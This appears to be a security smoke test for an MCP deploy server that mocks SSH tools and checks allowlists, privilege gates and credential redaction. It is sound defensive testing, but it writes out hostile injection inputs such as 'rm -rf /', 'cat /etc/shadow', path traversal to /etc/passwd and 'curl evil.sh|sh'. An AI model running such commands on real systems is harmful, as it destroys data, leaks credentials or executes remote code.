/**
 * deploykit-mcp smoke + security assertions.
 *
 * Fully self-contained and mocked: it writes its own fake `sshcon` and `ssh`
 * into a temp dir and points the server at them. It NEVER touches real
 * infrastructure and never invokes the real sshcon.
 *
 *   npm run build && npm run smoke
 *
 * The security assertions (allowlists, privilege gates, no-secret-leak, audit)
 * are the point of this file. If you add a tool or a verb, add assertions here.
 */

import fs from "node:fs";
import http from "node:http";
import { spawnSync } from "node:child_process";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const MCP_ROOT = path.resolve(HERE, "..");
const SERVER = path.join(MCP_ROOT, "dist", "server.js");

if (!fs.existsSync(SERVER)) {
  console.error(`missing ${SERVER} — run \`npm run build\` first`);
  process.exit(1);
}

// --- temp workspace -------------------------------------------------------
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), "deploykit-smoke-"));
const BIN = path.join(TMP, "bin");
const AUDIT = path.join(TMP, "audit.jsonl");
const SSH_LOG = path.join(TMP, "ssh-argv.log");
const SCP_LOG = path.join(TMP, "scp-argv.log");
const GLAB_LOG = path.join(TMP, "glab-argv.log");
const RSYNC_LOG = path.join(TMP, "rsync-argv.log");
fs.mkdirSync(BIN, { recursive: true });

// Canned sshcon. Note: the server invokes this by ABSOLUTE PATH via
// DEPLOYKIT_SSHCON_BIN. It must never be resolved via PATH, because a real
// `sshcon` shell function would shadow PATH and hit live infrastructure.
//
// `webapp` reproduces the REAL production layout: ANSI-coloured whitespace
// columns (no colons), and — critically — decoy FTP and Admin-Panel passwords.
// The label "Password" appears three times in real output, so this fixture is
// what proves the parser is section-scoped and picks the SSH one.
// `webhost` uses the simpler `key: value` layout, so both are covered.
fs.writeFileSync(
  path.join(BIN, "sshcon"),
  `#!/usr/bin/env node
const E = "\\u001b";
const dim = (s) => E + "[2m" + s + E + "[0m";
const cmd = process.argv[2];
const key = process.argv[3];
// version --json: the capability gate reads .result.version from here.
if (cmd === "version") {
  const version = process.env.MOCK_SSHCON_VERSION || "2.13.0";
  if (process.argv.includes("--json")) {
    console.log(JSON.stringify({ type: "result", subtype: "success", is_error: false, command: "version", result: { name: "@indianic/sshcon", version, apiBaseUrl: "https://mock" }, duration_ms: 1, uuid: "mock-uuid" }));
  } else { console.log("sshcon v" + version); }
  process.exit(0);
}
// ssh-key <name> --write <path>: export the managed key to a 0600 file. The key
// material goes ONLY to the file (never stdout), mirroring the real contract.
if (cmd === "ssh-key") {
  const wi = process.argv.indexOf("--write");
  const outPath = wi >= 0 ? process.argv[wi + 1] : null;
  if (!outPath) { console.error("usage: sshcon ssh-key <name> --write <path>"); process.exit(2); }
  if (key === "nokey") { console.error('sshcon: connection "' + key + '" has no SSH private key'); process.exit(1); }
  require("node:fs").writeFileSync(outPath, "-----BEGIN OPENSSH PRIVATE KEY-----\\nMANAGEDKEYMATERIAL\\n-----END OPENSSH PRIVATE KEY-----\\n", { mode: 0o600 });
  process.exit(0);
}
if (cmd !== "list") { console.error("usage: sshcon list <key>"); process.exit(2); }
if (key === "webapp") {
  console.log(E + "[0;34m" + "\\u2139 Info: Searching for server: webapp" + E + "[0m");
  console.log("");
  console.log("  " + E + "[1mwebapp" + E + "[0m  " + dim("\\u00b7 webapp.example.com"));
  console.log("");
  console.log("  " + E + "[0;36m\\ud83d\\udccb  " + E + "[1mGeneral" + E + "[0m");
  console.log("  " + dim("Server Name       ") + "  webhost");
  console.log("  " + dim("Application Port  ") + "  50034");
  console.log("");
  console.log("  " + E + "[0;36m\\ud83d\\udda5\\ufe0f   " + E + "[1mSSH Connection" + E + "[0m");
  console.log("  " + dim("Host              ") + "  192.0.2.10");
  console.log("  " + dim("Port              ") + "  22");
  console.log("  " + dim("Username          ") + "  mock_webapp");
  console.log("  " + dim("Password          ") + "  MOCK-SSH-SECRET");
  console.log("  " + dim("Auth Type         ") + "  password");
  console.log("  " + dim("Post-Login Path   ") + "  /var/www/clients/client1/web18/web");
  console.log("");
  console.log("  " + E + "[0;36m\\ud83d\\udcc1  " + E + "[1mFTP" + E + "[0m");
  console.log("  " + dim("User              ") + "  ftp_wrong_user");
  console.log("  " + dim("Password          ") + "  MOCK-FTP-WRONG-SECRET");
  console.log("");
  console.log("  " + E + "[0;36m\\ud83d\\udd27  " + E + "[1mAdmin Panel" + E + "[0m");
  console.log("  " + dim("Password          ") + "  MOCK-ADMIN-WRONG-SECRET");
} else if (key === "webhost") {
  console.log("HOST: 192.0.2.10");
  console.log("PORT: 22");
  console.log("USER: root");
  console.log("PASSWORD: MOCK-not-a-real-secret");
} else if (key === "learning") {
  // Not in the built-in default allowlist; only reachable via operator config.
  console.log("HOST: 192.0.2.11");
  console.log("PORT: 22");
  console.log("USER: mock_learning");
  console.log("PASSWORD: MOCK-learning-secret");
  console.log("PATH: /var/www/clients/client1/web19/web");
} else if (key === "gateway") {
  // Auth Type: key, but NO key path and NO password — the key lives in sshcon's
  // own key store. This is the sshcon-managed shape the whole feature is about.
  console.log("  " + E + "[0;36m\\ud83d\\udda5\\ufe0f   " + E + "[1mSSH Connection" + E + "[0m");
  console.log("  " + dim("Host              ") + "  192.0.2.108");
  console.log("  " + dim("Port              ") + "  22");
  console.log("  " + dim("Username          ") + "  web108");
  console.log("  " + dim("Auth Type         ") + "  key");
  console.log("  " + dim("Post-Login Path   ") + "  /var/www/clients/client1/web108/web");
} else if (key === "keyfile") {
  // Auth Type: key WITH a local key path — an ordinary on-disk key (colon layout).
  console.log("HOST: 192.0.2.50");
  console.log("PORT: 22");
  console.log("USER: keyfileuser");
  console.log("AUTH TYPE: key");
  console.log("KEY: /home/op/.ssh/id_keyfile");
  console.log("PATH: /var/www/clients/client1/web50/web");
} else { console.error("unknown key: " + key); process.exit(1); }
`,
  { mode: 0o755 },
);

fs.writeFileSync(
  path.join(BIN, "ssh"),
  `#!/usr/bin/env bash
echo "ARGV: $*" >> "\${MOCK_SSH_LOG:-/dev/null}"
ALL="$*"
# Auth preflight probe: a server always denies PreferredAuthentications=none,
# but first advertises the methods it DOES offer. This is what the preflight parses.
case "$ALL" in
  *"PreferredAuthentications=none"*)
    echo "mock_webapp@host: Permission denied (publickey,password)." >&2
    exit 255 ;;
esac
# host_preflight probe: emit the canned facts of the real LobeHub failure box —
# pre-v2 CPU, ~4.7 GB RAM, no swap, 2 GB quota, no Docker — so every warning fires.
case "$ALL" in
  *"PREFLIGHT_DONE"*)
    echo "USER=web3"
    echo "UID=5005"
    echo "ARCH=x86_64"
    echo "CPU_X86_64_V2=0"
    echo "MEM_TOTAL_MB=4700"
    echo "MEM_AVAIL_MB=1200"
    echo "SWAP_TOTAL_MB=0"
    echo "DOCKER_PRESENT=0"
    echo "ROOTLESS_DOCKER_ACTIVE=0"
    echo "QUOTA_FIELDS=1500000|2000000|2097152"
    echo "HOME_AVAIL_MB=500"
    echo "PREFLIGHT_DONE=1"
    exit 0 ;;
esac
# The "fallback_user" host REFUSES key auth (publickey attempt fails), which must
# force the executor to fall back to the password attempt. Any non-publickey
# attempt to the same host (i.e. the password path) is allowed through.
case "$ALL" in
  *"fallback_user@"*)
    case "$ALL" in
      *"PreferredAuthentications=publickey"*)
        echo "fallback_user@host: Permission denied (publickey)." >&2
        exit 255 ;;
    esac ;;
esac
for a in "$@"; do
  case "$a" in
    *"docker version"*) echo "27.3.1"; exit 0 ;;
    *"compose"*"up"*)   echo "Container app Started"; exit 0 ;;
  esac
done
echo "MOCK_SSH_OK"
`,
  { mode: 0o755 },
);

// Canned scp — grant_docker_access delivers its root script by scp (never
// `bash -s` over stdin under sshpass; see finding A.3). Logs its argv so the
// smoke can prove the script was uploaded rather than piped through stdin.
fs.writeFileSync(
  path.join(BIN, "scp"),
  `#!/usr/bin/env bash
echo "ARGV: $*" >> "\${MOCK_SCP_LOG:-/dev/null}"
exit 0
`,
  { mode: 0o755 },
);

// Canned rsync — rsync.push logs its argv so tests can prove the identity (`-i
// <key>`) is injected into the `-e ssh …` transport and the excludes are present.
fs.writeFileSync(
  path.join(BIN, "rsync"),
  `#!/usr/bin/env bash
echo "ARGV: $*" >> "\${MOCK_RSYNC_LOG:-/dev/null}"
exit 0
`,
  { mode: 0o755 },
);

// Canned glab — logs its argv so pipeline tests can prove the self-hosted `-R`
// project ref is passed through (a bare owner/repo would default to gitlab.com).
fs.writeFileSync(
  path.join(BIN, "glab"),
  `#!/usr/bin/env bash
echo "ARGV: $*" >> "\${MOCK_GLAB_LOG:-/dev/null}"
echo "mock glab ok"
exit 0
`,
  { mode: 0o755 },
);

// Minimal laravel-shaped fixture: no network, no clone.
const FIXTURE = path.join(TMP, "fixture");
fs.mkdirSync(FIXTURE, { recursive: true });
fs.writeFileSync(path.join(FIXTURE, "artisan"), "#!/usr/bin/env php\n");
fs.writeFileSync(path.join(FIXTURE, "composer.json"), JSON.stringify({ require: { "laravel/framework": "^11" } }));
fs.writeFileSync(path.join(FIXTURE, "Dockerfile"), "FROM php:8.3-cli\nEXPOSE 2226\n");
fs.writeFileSync(
  path.join(FIXTURE, "docker-compose.yml"),
  `services:
  databasement:
    build: .
    ports:
      - "2226:2226"
    environment:
      TZ: UTC
      MYSQL_ROOT_PASSWORD: hunter2-must-not-leak
`,
);
fs.writeFileSync(
  path.join(FIXTURE, ".env"),
  `APP_KEY=base64:MUSTNOTLEAK/aaaaaaaaaaaaaaaaaaaaaaaaaaaa=
APP_URL=http://localhost
DB_PASSWORD=hunter2-must-not-leak
MAIL_HOST=smtp.example.com
LOG_LEVEL=debug
`,
);

// Fixture: Dockerfile + settings/*.json but NO dotenv file at all — the
// "config_model: non-env" case (this shape is real: HKUDS/DeepTutor reads a
// settings JSON file at runtime, not .env).
const JSON_FIXTURE = path.join(TMP, "fixture-json-config");
fs.mkdirSync(path.join(JSON_FIXTURE, "settings"), { recursive: true });
fs.writeFileSync(path.join(JSON_FIXTURE, "Dockerfile"), "FROM python:3.12-slim\n");
fs.writeFileSync(path.join(JSON_FIXTURE, "settings", "config.json"), JSON.stringify({ key: "value" }));

// Fixture: only a .env.sample — proves the new source is actually scanned.
const ENV_SAMPLE_FIXTURE = path.join(TMP, "fixture-env-sample");
fs.mkdirSync(ENV_SAMPLE_FIXTURE, { recursive: true });
fs.writeFileSync(path.join(ENV_SAMPLE_FIXTURE, ".env.sample"), "SAMPLE_ONLY_KEY=foo\n");

// Fixture: a podman-only compose.yaml (userns_mode: keep-id + a :U volume
// suffix) shipped ALONGSIDE a Docker-valid docker-compose.yml. `docker
// compose` prefers compose.yaml by filename precedence, which would silently
// run the Docker-invalid file if nothing flags the ambiguity.
const COMPOSE_FIXTURE = path.join(TMP, "fixture-multi-compose");
fs.mkdirSync(COMPOSE_FIXTURE, { recursive: true });
fs.writeFileSync(
  path.join(COMPOSE_FIXTURE, "compose.yaml"),
  `services:
  app:
    image: alpine
    userns_mode: keep-id
    volumes:
      - ./data:/data:U
`,
);
fs.writeFileSync(
  path.join(COMPOSE_FIXTURE, "docker-compose.yml"),
  `services:
  app:
    image: alpine
    ports:
      - "8080:8080"
`,
);

// Fixture: a LobeHub checkout (Next.js app WITH an @lobehub/* dep). It must
// route to the lobehub profile, not the generic nextjs one.
const LOBE_FIXTURE = path.join(TMP, "fixture-lobehub");
fs.mkdirSync(LOBE_FIXTURE, { recursive: true });
fs.writeFileSync(
  path.join(LOBE_FIXTURE, "package.json"),
  JSON.stringify({ name: "@lobehub/chat", dependencies: { next: "^15", "@lobehub/ui": "^1" } }),
);

// Fixture: env surface that lives in a compose SUBDIR (the real LobeHub shape:
// docker-compose/deploy/.env.example) — the root .env.example holds almost
// nothing. Proves detect_env deep-scans instead of only reading the root file.
const NESTED_ENV_FIXTURE = path.join(TMP, "fixture-nested-env");
fs.mkdirSync(path.join(NESTED_ENV_FIXTURE, "docker-compose", "deploy"), { recursive: true });
fs.writeFileSync(path.join(NESTED_ENV_FIXTURE, ".env.example"), "OPENAI_API_KEY=\n");
fs.writeFileSync(
  path.join(NESTED_ENV_FIXTURE, "docker-compose", "deploy", ".env.example"),
  "DATABASE_URL=\nKEY_VAULTS_SECRET=\nJWKS_KEY=\n",
);

// --- harness --------------------------------------------------------------
let pass = 0;
let fail = 0;
const results = [];
const assert = (name, cond, detail = "") => {
  if (cond) {
    pass++;
    results.push(["PASS", name, ""]);
  } else {
    fail++;
    results.push(["FAIL", name, String(detail)]);
  }
};
const textOf = (r) => r.content?.map((c) => c.text).join("\n") ?? "";
const jsonOf = (r) => {
  try {
    return JSON.parse(textOf(r));
  } catch {
    return null;
  }
};

const transport = new StdioClientTransport({
  command: "node",
  args: [SERVER],
  env: {
    ...process.env,
    PATH: `${BIN}:${process.env.PATH}`, // mock ssh; spawn() ignores shell functions
    DEPLOYKIT_SSHCON_BIN: path.join(BIN, "sshcon"), // absolute -> never the real sshcon
    DEPLOYKIT_AUDIT_PATH: AUDIT,
    MOCK_SSH_LOG: SSH_LOG,
    MOCK_SCP_LOG: SCP_LOG,
    MOCK_GLAB_LOG: GLAB_LOG,
    MOCK_RSYNC_LOG: RSYNC_LOG,
    // Stay hermetic: never read the operator's real ~/.deploykit/config.json
    // (its key pin would leak into these assertions). Unrestricted default.
    DEPLOYKIT_CONFIG: path.join(TMP, "no-such-config.json"),
    DEPLOYKIT_SSHCON_KEYS: "",
  },
  stderr: "pipe",
});

const client = new Client({ name: "deploykit-smoke", version: "1.0.0" });
await client.connect(transport);

// 1. surface
const { tools } = await client.listTools();
const names = tools.map((t) => t.name).sort();
const EXPECTED = [
  "analyze_repo", "detect_env", "domain_exec", "emit_root_runbook", "grant_docker_access",
  "health_check", "host_preflight", "lint_yaml", "pipeline_run", "pipeline_status",
  "pipeline_trace", "reload_config", "sshcon_resolve", "ssh_auth_preflight", "ssh_resolve", "target_resolve",
];
assert("tools/list exposes all 16 tools", names.length === 16 && EXPECTED.every((n) => names.includes(n)), names.join(","));
assert("every tool declares an object inputSchema", tools.every((t) => t.inputSchema?.type === "object"));

// 2. handle, not credentials — against the REAL ANSI column layout
const dom = await client.callTool({ name: "sshcon_resolve", arguments: { key: "webapp", kind: "domain" } });
const d = jsonOf(dom);
const dRaw = JSON.stringify(d ?? {});
assert("parses the REAL ANSI column layout (no colons)", !!d?.session_id && d?.host === "192.0.2.10" && d?.user === "mock_webapp", textOf(dom).slice(0, 240));
assert("parses Post-Login Path as app_dir", d?.app_dir === "/var/www/clients/client1/web18/web", d?.app_dir);
assert("parses Port from the column layout", d?.port === 22, String(d?.port));
assert("honours the declared Auth Type = password", d?.auth_method === "password", d?.auth_method);
assert("surfaces Application Port as the proxy_port hint", d?.application_port === "50034", d?.application_port);
assert("handle carries NO credential material", !/MOCK-SSH-SECRET/.test(dRaw), dRaw.slice(0, 200));

// The trap: "Password" appears under SSH, FTP, and Admin Panel. An unscoped
// parser picks a decoy and would SSH with the wrong credential.
assert("never reads the FTP / Admin-Panel decoy passwords", !/MOCK-FTP-WRONG-SECRET|MOCK-ADMIN-WRONG-SECRET/.test(dRaw), dRaw.slice(0, 240));
assert("redacted_raw masks EVERY password in the column layout",
  (d?.redacted_raw ?? "").includes("[redacted]") &&
  !/MOCK-SSH-SECRET|MOCK-FTP-WRONG-SECRET|MOCK-ADMIN-WRONG-SECRET/.test(d?.redacted_raw ?? ""),
  d?.redacted_raw);
assert("redacted_raw keeps non-secret facts readable", /192\.0\.2\.10/.test(d?.redacted_raw ?? ""), d?.redacted_raw);

const root = await client.callTool({ name: "sshcon_resolve", arguments: { key: "webhost", kind: "root" } });
const r = jsonOf(root);
assert("root handle hides the password", !/MOCK-not-a-real-secret/.test(JSON.stringify(r ?? {})));

// 3. sshcon key: UNRESTRICTED by default; the pin is opt-in
const learn = await client.callTool({ name: "sshcon_resolve", arguments: { key: "learning", kind: "domain" } });
assert("any sshcon key resolves by default (no pin configured)", !learn.isError && jsonOf(learn)?.user === "mock_learning", textOf(learn).slice(0, 160));

const badChar = await client.callTool({ name: "sshcon_resolve", arguments: { key: "evil; rm -rf /", kind: "domain" } });
assert("argv-unsafe key name REJECTED (hygiene, not policy)", badChar.isError === true && /not a valid key name/i.test(textOf(badChar)), textOf(badChar).slice(0, 160));

// 4. verb allowlist
const up = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "docker.compose.up" } });
assert("allowlisted verb builds expected argv", !up.isError && /docker.*compose.*--project-directory.*up.*-d.*--build/s.test(jsonOf(up)?.argv ?? ""), jsonOf(up)?.argv);

// --- deploy-direct: read-only preflight verbs ---
const which = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "bin.which", params: { bin: "node" } } });
assert("bin.which builds `command -v <bin>` argv", !which.isError && /command.*-v.*node/s.test(jsonOf(which)?.argv ?? ""), jsonOf(which)?.argv);

const ver = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "bin.version", params: { bin: "pm2" } } });
assert("bin.version builds `<bin> --version` argv", !ver.isError && /pm2.*--version/s.test(jsonOf(ver)?.argv ?? ""), jsonOf(ver)?.argv);

const badVer = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "bin.version", params: { bin: "arbitrary-tool" } } });
assert("bin.version REJECTS a runtime outside the closed enum (argv[0] exec)", badVer.isError === true && /failed validation/i.test(textOf(badVer)), textOf(badVer).slice(0, 140));

const badBin = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "bin.which", params: { bin: "node; rm -rf /" } } });
assert("bin.which REJECTS a non-binary-name param", badBin.isError === true && /failed validation/i.test(textOf(badBin)), textOf(badBin).slice(0, 140));

// --- deploy-direct: native pm2 run verbs (domain user) ---
const eco = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.start.ecosystem", params: { ecosystem: "ecosystem.config.cjs" } } });
assert("pm2.start.ecosystem builds `pm2 start <appdir>/ecosystem.config.cjs`", !eco.isError && /pm2.*start.*web18\/web\/ecosystem\.config\.cjs/s.test(jsonOf(eco)?.argv ?? ""), jsonOf(eco)?.argv);

const scr = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.start.script", params: { script: "server.js", name: "app" } } });
assert("pm2.start.script builds pm2 start with --name and --cwd", !scr.isError && /pm2.*start.*server\.js.*--name.*app.*--cwd/s.test(jsonOf(scr)?.argv ?? ""), jsonOf(scr)?.argv);

const badScript = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.start.script", params: { script: "../../../../etc/passwd", name: "app" } } });
assert("pm2.start.script REJECTS path traversal in script (stays inside APP_DIR)", badScript.isError === true && /failed validation/i.test(textOf(badScript)), textOf(badScript).slice(0, 140));

const restart = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.restart", params: { name: "app" } } });
assert("pm2.restart builds `pm2 restart <name>`", !restart.isError && /pm2.*restart.*app/s.test(jsonOf(restart)?.argv ?? ""), jsonOf(restart)?.argv);

const logs = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.logs", params: { name: "app", lines: "50" } } });
assert("pm2.logs is read-only (--nostream) with validated lines", !logs.isError && /pm2.*logs.*app.*--lines.*50.*--nostream/s.test(jsonOf(logs)?.argv ?? ""), jsonOf(logs)?.argv);

const status = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.status" } });
assert("pm2.status builds `pm2 jlist`", !status.isError && /pm2.*jlist/s.test(jsonOf(status)?.argv ?? ""), jsonOf(status)?.argv);

const badName = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.restart", params: { name: "app; reboot" } } });
assert("pm2.restart REJECTS a bad name param", badName.isError === true && /failed validation/i.test(textOf(badName)), textOf(badName).slice(0, 140));

const badEco = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "pm2.start.ecosystem", params: { ecosystem: "../../etc/passwd" } } });
assert("pm2.start.ecosystem REJECTS a non-ecosystem filename", badEco.isError === true && /failed validation/i.test(textOf(badEco)), textOf(badEco).slice(0, 140));

for (const [label, args, expect] of [
  ["raw command string", { verb: "bash -c 'cat /etc/shadow'" }, /not allowlisted/i],
  ["non-allowlisted verb", { verb: "docker.compose.exec" }, /not allowlisted/i],
  ["param injection", { verb: "docker.compose.restart", params: { service: "web; rm -rf /" } }, /failed validation/i],
  ["unknown param", { verb: "docker.compose.up", params: { evil: "x" } }, /does not accept param/i],
]) {
  const res = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, ...args } });
  assert(`domain_exec ${label} REJECTED`, res.isError === true && expect.test(textOf(res)), textOf(res).slice(0, 140));
}

// 5. root gate
const asDomain = await client.callTool({ name: "grant_docker_access", arguments: { root_session_id: d.session_id, domain_user: "webapp" } });
assert("grant_docker_access with NON-ROOT session REJECTED", asDomain.isError === true && /requires a root-kind session/i.test(textOf(asDomain)));

const asRoot = await client.callTool({ name: "grant_docker_access", arguments: { root_session_id: r.session_id, domain_user: "webapp" } });
assert("grant_docker_access with ROOT session runs the fixed script", !asRoot.isError, textOf(asRoot).slice(0, 160));
assert("grant_docker_access reports which auth method connected", ["key", "password", "default"].includes(jsonOf(asRoot)?.auth_method_used), jsonOf(asRoot)?.auth_method_used);
assert("grant_docker_access surfaces docker-CE-install + setuptool markers", typeof jsonOf(asRoot)?.docker_ce_installed === "boolean" && typeof jsonOf(asRoot)?.setuptool_nonzero === "boolean", JSON.stringify(jsonOf(asRoot)));

const argvLog = fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8") : "";
const scpLog = fs.existsSync(SCP_LOG) ? fs.readFileSync(SCP_LOG, "utf8") : "";
// A.3: the script is DELIVERED BY SCP, never piped over `bash -s` stdin (which
// steals sshpass's channel). Prove the upload happened and the old form is gone.
assert("root script is delivered by scp (not `bash -s` stdin)", /deploykit-rootless-.*\.sh/.test(scpLog) && /root@192\.0\.2\.10:\/tmp\/deploykit-rootless/.test(scpLog), scpLog.slice(0, 200));
assert("root call NO LONGER uses the `bash -s` stdin form", !/bash -s/.test(argvLog), argvLog.slice(0, 200));
assert("root call runs the uploaded script with domain_user as a positional arg", /bash -c .*deploykit-rootless-.*\.sh.* webapp/.test(argvLog), argvLog.slice(0, 240));
assert("root call ran no other command", !/curl |wget |chmod 777/.test(argvLog));

const badUser = await client.callTool({ name: "grant_docker_access", arguments: { root_session_id: r.session_id, domain_user: "root; curl evil.sh|sh" } });
assert("malformed domain_user REJECTED", badUser.isError === true);

// 5a2. ssh_auth_preflight — reads the methods the server OFFERS, no credential.
const pf = jsonOf(await client.callTool({ name: "ssh_auth_preflight", arguments: { session_id: d.session_id } }));
assert("ssh_auth_preflight parses the server's advertised methods", Array.isArray(pf?.methods) && pf.methods.includes("publickey") && pf.methods.includes("password"), JSON.stringify(pf?.methods));
assert("ssh_auth_preflight classifies both-methods host as \"both\"", pf?.classification === "both" && pf?.offers_key === true && pf?.offers_password === true, JSON.stringify(pf));
const pfBad = await client.callTool({ name: "ssh_auth_preflight", arguments: { session_id: "00000000-0000-0000-0000-000000000000" } });
assert("ssh_auth_preflight on an unknown session errors cleanly", pfBad.isError === true, textOf(pfBad).slice(0, 120));

// 5a3. host_preflight — parses the capability facts and raises the right warnings.
const hp = jsonOf(await client.callTool({ name: "host_preflight", arguments: { session_id: d.session_id } }));
assert("host_preflight detects a pre-v2 CPU", hp?.cpu_x86_64_v2 === false, JSON.stringify(hp));
assert("host_preflight parses RAM + swap (usable = avail + swap)", hp?.mem_available_mb === 1200 && hp?.swap_total_mb === 0 && hp?.usable_mem_mb === 1200, JSON.stringify(hp));
assert("host_preflight parses the 2 GB disk quota hard limit", hp?.disk_quota_hard_mb === 2048, JSON.stringify(hp));
assert("host_preflight sees Docker absent", hp?.docker_present === false, JSON.stringify(hp));
assert("host_preflight warns about x86-64-v2 (sharp)", (hp?.warnings ?? []).some((w) => /x86-64-v2|sharp/.test(w)), JSON.stringify(hp?.warnings));
assert("host_preflight warns about the build-peak memory shortfall", (hp?.warnings ?? []).some((w) => /build peak|swapfile/.test(w)), JSON.stringify(hp?.warnings));
assert("host_preflight warns about the tight ISPConfig quota", (hp?.warnings ?? []).some((w) => /disk quota|ISPConfig/.test(w)), JSON.stringify(hp?.warnings));
assert("host_preflight verdict ok_to_build_here is false for this box", hp?.ok_to_build_here === false, JSON.stringify(hp));

// 5b. NEW diagnostic verbs — fixed argv, no shell, run over the domain session.
// docker.info.rootless must pass its {{json .SecurityOptions}} Go template THROUGH
// resolveTemplate untouched (only {token} single-brace lowercase is a placeholder).
const dinfo = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "docker.info.rootless" } });
const dinfoArgv = jsonOf(dinfo)?.argv ?? "";
assert("verb docker.info.rootless builds expected argv", !dinfo.isError && /docker.*info.*--format/s.test(dinfoArgv), dinfoArgv);
assert("verb docker.info.rootless leaves {{json .SecurityOptions}} UNMANGLED", dinfoArgv.includes("{{json .SecurityOptions}}"), dinfoArgv);

const sysd = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "systemd.user.docker" } });
assert("verb systemd.user.docker builds expected argv", !sysd.isError && /systemctl.*--user.*is-active.*docker/s.test(jsonOf(sysd)?.argv ?? ""), jsonOf(sysd)?.argv);

const lsattr = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "fs.lsattr.home", params: { home: "/var/www/clients/client1/web18/web" } } });
assert("verb fs.lsattr.home resolves {home} param into argv", !lsattr.isError && /lsattr.*-d.*\/var\/www\/clients\/client1\/web18\/web/s.test(jsonOf(lsattr)?.argv ?? ""), jsonOf(lsattr)?.argv);

const lsattrBad = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "fs.lsattr.home", params: { home: "/etc; rm -rf /" } } });
assert("verb fs.lsattr.home REJECTS a non-path home param", lsattrBad.isError === true && /failed validation/i.test(textOf(lsattrBad)), textOf(lsattrBad).slice(0, 140));

const subuid = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "subid.subuid" } });
assert("verb subid.subuid resolves {user} from facts into argv", !subuid.isError && /getent.*subuid.*mock_webapp/s.test(jsonOf(subuid)?.argv ?? ""), jsonOf(subuid)?.argv);

const subgid = await client.callTool({ name: "domain_exec", arguments: { session_id: d.session_id, verb: "subid.subgid" } });
assert("verb subid.subgid resolves {user} from facts into argv", !subgid.isError && /getent.*subgid.*mock_webapp/s.test(jsonOf(subgid)?.argv ?? ""), jsonOf(subgid)?.argv);

// 5c. emit_root_runbook — a PURE TEXT generator: no ssh, no exec, one audit line.
const sshLogBefore = fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8") : "";
const rbEmit = await client.callTool({ name: "emit_root_runbook", arguments: { domain_user: "webapp", host: "db.example.com", needs: ["web root is chattr +i"] } });
const rbJson = jsonOf(rbEmit);
assert("emit_root_runbook returns cover_note + runbook + verify_hint",
  !rbEmit.isError && typeof rbJson?.cover_note === "string" && rbJson.cover_note.length > 0 &&
  typeof rbJson?.runbook === "string" && rbJson.runbook.length > 0 &&
  typeof rbJson?.verify_hint === "string" && rbJson.verify_hint.length > 0,
  textOf(rbEmit).slice(0, 160));
assert("emit_root_runbook runbook contains the DEPLOYKIT_VERIFY marker", /DEPLOYKIT_VERIFY:/.test(rbJson?.runbook ?? ""), (rbJson?.runbook ?? "").slice(0, 120));
assert("emit_root_runbook verify_hint points at the DEPLOYKIT_VERIFY line", /DEPLOYKIT_VERIFY:/.test(rbJson?.verify_hint ?? ""), rbJson?.verify_hint);

// domain_user is a POSITIONAL argument ($1), NEVER interpolated into the body.
assert("emit_root_runbook binds domain_user as positional $1", /U="\$1"/.test(rbJson?.runbook ?? ""), (rbJson?.runbook ?? "").slice(0, 200));
assert("emit_root_runbook does NOT interpolate the domain_user into the runbook body", !/webapp/.test(rbJson?.runbook ?? ""), "runbook must not contain the literal user");
assert("emit_root_runbook shows the user as the positional invocation in the cover note", /bash deploykit-rootless-docker\.sh webapp/.test(rbJson?.cover_note ?? ""), rbJson?.cover_note);

// The generated runbook must be valid bash.
const rbFile = path.join(TMP, "emitted-runbook.sh");
fs.writeFileSync(rbFile, rbJson?.runbook ?? "");
const rbSyntax = spawnSync("bash", ["-n", rbFile], { encoding: "utf8" });
assert("emit_root_runbook runbook passes `bash -n`", rbSyntax.status === 0, rbSyntax.stderr?.slice(0, 200));

// #3: the runbook must install Docker CE when absent and tolerate the setuptool's
// expected uid-remap non-zero exit (mirrors the executed script's hardening).
assert("runbook installs Docker CE when absent (get.docker.com)", /get\.docker\.com/.test(rbJson?.runbook ?? ""), (rbJson?.runbook ?? "").slice(0, 80));
assert("runbook tolerates the setuptool's expected uid-remap non-zero exit", /expected under uid-remap/.test(rbJson?.runbook ?? ""), "");

// Invariant #3: it executed NOTHING — the mock ssh log is byte-for-byte unchanged.
const sshLogAfter = fs.existsSync(SSH_LOG) ? fs.readFileSync(SSH_LOG, "utf8") : "";
assert("emit_root_runbook made NO ssh call (ssh log unchanged)", sshLogAfter === sshLogBefore, "ssh log changed during a pure-text call");

// A bad domain_user is rejected before any text is produced.
const rbBad = await client.callTool({ name: "emit_root_runbook", arguments: { domain_user: "root; rm -rf /", host: "db.example.com" } });
assert("emit_root_runbook REJECTS a malformed domain_user", rbBad.isError === true, textOf(rbBad).slice(0, 140));

// Exactly one audit line, privilege "none", no ssh.
const auditNow = fs.existsSync(AUDIT) ? fs.readFileSync(AUDIT, "utf8").trim().split("\n").filter(Boolean).map((l) => { try { return JSON.parse(l); } catch { return null; } }) : [];
const rbAudit = auditNow.filter((e) => e?.tool === "emit_root_runbook" && e?.outcome === "ok");
